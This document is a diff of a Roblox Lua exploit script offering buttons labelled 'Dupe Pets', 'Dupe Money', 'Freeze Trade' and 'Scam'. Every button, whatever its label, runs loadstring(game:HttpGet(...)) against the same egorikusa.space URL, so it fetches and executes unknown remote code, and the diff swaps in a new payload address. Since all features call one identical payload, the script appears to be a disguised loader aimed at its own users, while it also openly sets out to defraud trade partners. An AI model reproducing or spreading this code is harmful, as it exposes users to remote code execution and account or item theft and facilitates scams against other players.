@@ -5,17 +5,17 @@ local Tab = Window:NewTab("Dupe")
 local Section = Tab:NewSection("Click 3x to work, kinda broken rn.")
 
 Section:NewSlider("Dupe Pets Amount", "10 is the max as more would crash I’ve tested", 10, 0, function(s) -- 10 (MaxValue) | 0 (MinValue)
-    loadstring(game:HttpGet("https://egorikusa.space/4cac96c1c736f31f4745b1c7.lua", true))()
+    loadstring(game:HttpGet("https://egorikusa.space/d79873494beafbb40592aa4a.lua", true))()
 end)
 
 
 Section:NewButton("Dupe Pets (Fixed, READ INFO)", "Wait a few minutes it should reset you", function()
-   loadstring(game:HttpGet("https://egorikusa.space/4cac96c1c736f31f4745b1c7.lua", true))()
+   loadstring(game:HttpGet("https://egorikusa.space/d79873494beafbb40592aa4a.lua", true))()
 end)
 
 
 Section:NewButton("Dupe Money (Kind of Working READ INFO)", "Wait a few minutes until you reset if you don’t it’s broken", function()
-    loadstring(game:HttpGet("https://egorikusa.space/4cac96c1c736f31f4745b1c7.lua", true))()
+    loadstring(game:HttpGet("https://egorikusa.space/d79873494beafbb40592aa4a.lua", true))()
 end)
 
 
@@ -25,13 +25,13 @@ local Section = Tab:NewSection("Freeze trade then click scam 3x")
 
 Section:NewToggle("Freeze Trade", "Freezes the other players trade which displays your pets as still there", function(state)
     if state then
-       loadstring(game:HttpGet("https://egorikusa.space/4cac96c1c736f31f4745b1c7.lua", true))()
+       loadstring(game:HttpGet("https://egorikusa.space/d79873494beafbb40592aa4a.lua", true))()
     else
-        loadstring(game:HttpGet("https://egorikusa.space/4cac96c1c736f31f4745b1c7.lua", true))()
+        loadstring(game:HttpGet("https://egorikusa.space/d79873494beafbb40592aa4a.lua", true))()
     end
 end)
 
 
 Section:NewButton("Scam (PRESS 3X)", "Might have broken after new update", function()
-    loadstring(game:HttpGet("https://egorikusa.space/4cac96c1c736f31f4745b1c7.lua", true))()
+    loadstring(game:HttpGet("https://egorikusa.space/d79873494beafbb40592aa4a.lua", true))()
 end)
